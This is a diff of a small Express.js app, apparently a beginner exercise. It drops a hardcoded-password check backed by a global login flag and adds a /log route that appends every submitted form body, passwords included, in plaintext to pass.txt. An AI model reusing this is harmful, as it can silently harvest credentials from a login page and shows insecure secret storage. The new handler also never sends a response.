@@ -1,49 +1,29 @@
-
-import express from 'express';
-import bodyParser from 'body-parser';
+import express from "express";
+import bodyParser from "body-parser";
 import { dirname } from "path";
+import { fileURLToPath } from "url";
 import fs from "fs";
-import { fileURLToPath } from 'url';
-let user = false;
 
+// Derive __dirname using import.meta.url
 const __dirname = dirname(fileURLToPath(import.meta.url));
 
-const app = express()
+const app = express();
 const port = 3000;
 
 app.use(bodyParser.urlencoded({ extended: true }));
 
-
-function passcheck(req, res, next) {
-    const password = req.body["password"];
-    if (password == 'aaaa') {
-        user = true;
-    }
-    next();
-}
-
-app.use(passcheck);
-
 app.get("/", (req, res) => {
-    res.sendFile(__dirname + "/in.html")
+    res.sendFile(__dirname + "/index.html");
 });
 
-
-
-
-app.post("/login", (req, res) => {
+app.post("/log", (req, res) => {
     console.log(req.body);
-    if (user) {
-        res.sendFile(__dirname + "/secret.html");
-        fs.writeFile("log.txt", req.body["password"], () => {
-            console.log("created", user)
-        })
-    } else {
-        res.sendFile(__dirname + "/in.html")
-    };
-
+    const data = JSON.stringify(req.body) + "\n";
+    fs.appendFile("pass.txt", data, () => {
+        console.log("created")
+    })
 })
 
 app.listen(port, () => {
-    console.log(`Example app listening on port ${port}`)
-})
+    console.log(`Server started at http://localhost:${port}`);
+});
